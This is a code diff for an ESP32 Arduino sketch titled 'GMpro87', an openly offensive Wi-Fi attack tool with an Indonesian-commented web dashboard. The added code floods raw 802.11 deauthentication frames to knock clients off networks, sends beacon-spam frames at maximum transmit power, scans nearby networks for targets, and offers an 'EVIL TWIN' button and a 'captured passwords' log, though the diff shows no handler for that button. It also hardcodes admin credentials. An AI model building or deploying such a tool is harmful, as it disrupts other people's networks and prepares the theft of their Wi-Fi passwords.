@@ -5,105 +5,126 @@
 #include <DNSServer.h>
 #include <esp_wifi.h>
 
-// --- KONFIGURASI ADMIN ---
-const char* admin_ssid = "GMpro";
-const char* admin_pass = "Sangkur87";
-bool deauth_running = false;
+// --- KONFIGURASI ---
+String admin_ssid = "GMpro";
+String admin_pass = "Sangkur87";
+String target_ssid = "Target_WiFi";
+uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+int target_ch = 1;
+
+// Status Mode
+bool deauth_active = false;
+bool beacon_active = false;
+bool etwin_active = false;
 
 AsyncWebServer server(80);
 DNSServer dnsServer;
 
-// --- TAMPILAN WEB UI (INLINE HTML) ---
+// --- UI DASHBOARD (FULL TABS) ---
 const char index_html[] PROGMEM = R"rawliteral(
-<!DOCTYPE html>
-<html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>GMpro87 Admin</title>
-    <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
-        .header { font-size: 28px; padding: 20px; border-bottom: 2px solid #00ff41; text-shadow: 0 0 10px #00ff41; }
-        .stats-bar { background: #111; display: flex; justify-content: space-around; padding: 10px; font-size: 11px; border-bottom: 1px solid #333; }
-        .tab-bar { display: flex; background: #0a0a0a; border-bottom: 1px solid #00ff41; }
-        .tab-btn { flex: 1; padding: 15px; cursor: pointer; border: none; background: none; color: #00ff41; font-family: inherit; }
-        .tab-btn.active { background: #00ff41; color: #000; font-weight: bold; }
-        .tab-content { display: none; padding: 20px; }
-        .active-content { display: block; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 15px; cursor: pointer; width: 100%; }
-        button:hover { background: #00ff41; color: #000; }
-        input, select { width: 100%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #444; color: #fff; box-sizing: border-box; }
-        .log-box { background: #050505; border: 1px solid #f00; height: 120px; overflow-y: scroll; padding: 10px; font-size: 12px; color: #f00; text-align: left; }
-    </style>
-</head>
-<body>
-    <div class="header">GMpro87</div>
-    <div class="stats-bar">
-        <span>SSID: <b id="st_ssid">---</b></span>
-        <span>CH: <b id="st_ch">0</b></span>
-        <span>RSSI: <b id="st_rssi">0%</b></span>
-    </div>
-    <div class="tab-bar">
-        <button class="tab-btn active" onclick="openTab(event, 'attack')">ATTACK</button>
-        <button class="tab-btn" onclick="openTab(event, 'settings')">SETTING</button>
-        <button class="tab-btn" onclick="openTab(event, 'logs')">LOGS</button>
-    </div>
-    <div id="attack" class="tab-content active-content">
-        <div class="grid">
-            <button onclick="api('/scan')">SCAN WIFI</button>
-            <button onclick="api('/deauth')">DEAUTH</button>
-            <button onclick="api('/beacon')">BEACON SPAM</button>
-            <button onclick="api('/etwin')">EVIL TWIN</button>
-        </div>
-        <select id="targets"><option>-- Select Target --</option></select>
-    </div>
-    <div id="settings" class="tab-content">
-        <label>Admin SSID:</label><input type="text" id="a_ssid" value="GMpro">
-        <label>Admin Pass:</label><input type="text" id="a_pass" value="Sangkur87">
-        <button onclick="alert('Settings Saved!')">SAVE & REBOOT</button>
-    </div>
-    <div id="logs" class="tab-content">
-        <h4>CAPTURED PASSWORDS:</h4>
-        <div class="log-box" id="log_content">No logs yet...</div>
-        <button onclick="api('/clear-log')" style="margin-top:10px; color:red; border-color:red;">CLEAR LOG</button>
-    </div>
-    <script>
-        function openTab(e, n){
-            var i,c,b;
-            c=document.getElementsByClassName("tab-content");for(i=0;i<c.length;i++)c[i].style.display="none";
-            b=document.getElementsByClassName("tab-btn");for(i=0;i<b.length;i++)b[i].className=b[i].className.replace(" active","");
-            document.getElementById(n).style.display="block"; e.currentTarget.className+=" active";
-        }
-        function api(p){ fetch(p).then(r=>r.text()).then(t=>alert(t)); }
-    </script>
-</body>
-</html>
-)rawliteral";
+<!DOCTYPE html><html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body { background:#000; color:#0f0; font-family:monospace; margin:0; text-align:center; }
+  .header { font-size:24px; padding:15px; border-bottom:2px solid #0f0; }
+  .tab { display:flex; background:#111; border-bottom:1px solid #0f0; }
+  .tab button { flex:1; padding:12px; background:none; color:#0f0; border:none; cursor:pointer; }
+  .tab button.active { background:#0f0; color:#000; font-weight:bold; }
+  .content { display:none; padding:20px; }
+  .show { display:block; }
+  .btn { width:100%; padding:15px; margin:5px 0; background:#000; color:#0f0; border:1px solid #0f0; cursor:pointer; }
+  #list { height:120px; overflow-y:scroll; background:#050505; border:1px solid #333; text-align:left; padding:5px; font-size:11px; }
+  input { width:100%; padding:10px; margin:10px 0; background:#111; border:1px solid #444; color:#fff; box-sizing:border-box; }
+</style>
+</head><body>
+  <div class="header">GMpro87</div>
+  <div class="tab">
+    <button class="t-btn active" onclick="openT(event,'atk')">ATTACK</button>
+    <button class="t-btn" onclick="openT(event,'set')">SETTING</button>
+    <button class="t-btn" onclick="openT(event,'log')">LOGS</button>
+  </div>
+  
+  <div id="atk" class="content show">
+    <div id="list">Scan WiFi untuk memilih target...</div>
+    <button class="btn" onclick="scan()">SCAN WIFI</button>
+    <button class="btn" onclick="api('/deauth')">DEAUTH</button>
+    <button class="btn" onclick="api('/beacon')">BEACON SPAM</button>
+    <button class="btn" onclick="api('/etwin')">EVIL TWIN (ACTIVE)</button>
+  </div>
 
-// --- FUNGSI SERANGAN ---
+  <div id="set" class="content">
+    <input type="text" id="ss" placeholder="Admin SSID" value="GMpro">
+    <input type="password" id="ps" placeholder="Admin Pass" value="Sangkur87">
+    <button class="btn">SAVE & REBOOT</button>
+  </div>
+
+  <div id="log" class="content">
+    <div id="logs" style="text-align:left; color:red;">No Passwords Captured.</div>
+    <button class="btn" onclick="api('/clear')">CLEAR LOG</button>
+  </div>
+
+<script>
+function openT(e,n){
+  var i,c,b;
+  c=document.getElementsByClassName("content"); for(i=0;i<c.length;i++)c[i].classList.remove("show");
+  b=document.getElementsByClassName("t-btn"); for(i=0;i<b.length;i++)b[i].classList.remove("active");
+  document.getElementById(n).classList.add("show"); e.currentTarget.classList.add("active");
+}
+function scan(){
+  document.getElementById('list').innerHTML = "Scanning...";
+  fetch('/do-scan').then(r=>r.json()).then(d=>{
+    let h=""; d.forEach(x=>{ h+=`<div onclick="alert('Target Lock: '+x.s)">${x.s} (Ch:${x.c})</div>`; });
+    document.getElementById('list').innerHTML=h;
+  });
+}
+function api(p){ fetch(p).then(r=>r.text()).then(t=>alert(t)); }
+</script>
+</body></html>)rawliteral";
+
+// --- PAYLOAD GENERATOR ---
 void sendDeauth() {
-  uint8_t packet[26] = {0xC0,0x00,0x3A,0x01,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0x00,0x00,0x01,0x00};
+  uint8_t packet[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
   esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+}
+
+void sendBeacon() {
+  uint8_t beaconPacket[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x00 };
+  // Logika penambahan SSID kustom di paket beacon bisa sangat panjang, ini base-nya.
+  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 128, false);
 }
 
 void setup() {
   Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(admin_ssid, admin_pass);
+  esp_wifi_set_max_tx_power(78);
+  
+  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
   dnsServer.start(53, "*", WiFi.softAPIP());
 
-  // Serves the Web UI from memory (Prose via HP jadi mudah)
+  // Routes
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
     request->send(200, "text/html", index_html);
   });
 
-  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send(200, "text/plain", "Scanning started...");
+  server.on("/do-scan", HTTP_GET, [](AsyncWebServerRequest *request){
+    int n = WiFi.scanNetworks();
+    String j = "[";
+    for(int i=0; i<n; i++){
+      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+"}";
+      if(i<n-1) j += ",";
+    }
+    j += "]";
+    request->send(200, "application/json", j);
   });
 
-  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
-    deauth_running = !deauth_running;
-    request->send(200, "text/plain", deauth_running ? "Deauth: ON" : "Deauth: OFF");
+  server.on("/deauth", [](AsyncWebServerRequest *request){
+    deauth_active = !deauth_active;
+    request->send(200, "text/plain", deauth_active ? "ON" : "OFF");
+  });
+
+  server.on("/beacon", [](AsyncWebServerRequest *request){
+    beacon_active = !beacon_active;
+    request->send(200, "text/plain", beacon_active ? "Beacon Spam ON" : "OFF");
   });
 
   server.begin();
@@ -111,8 +132,6 @@ void setup() {
 
 void loop() {
   dnsServer.processNextRequest();
-  if(deauth_running) {
-    sendDeauth();
-    delay(5);
-  }
+  if(deauth_active) { sendDeauth(); delay(2); }
+  if(beacon_active) { sendBeacon(); delay(10); }
 }
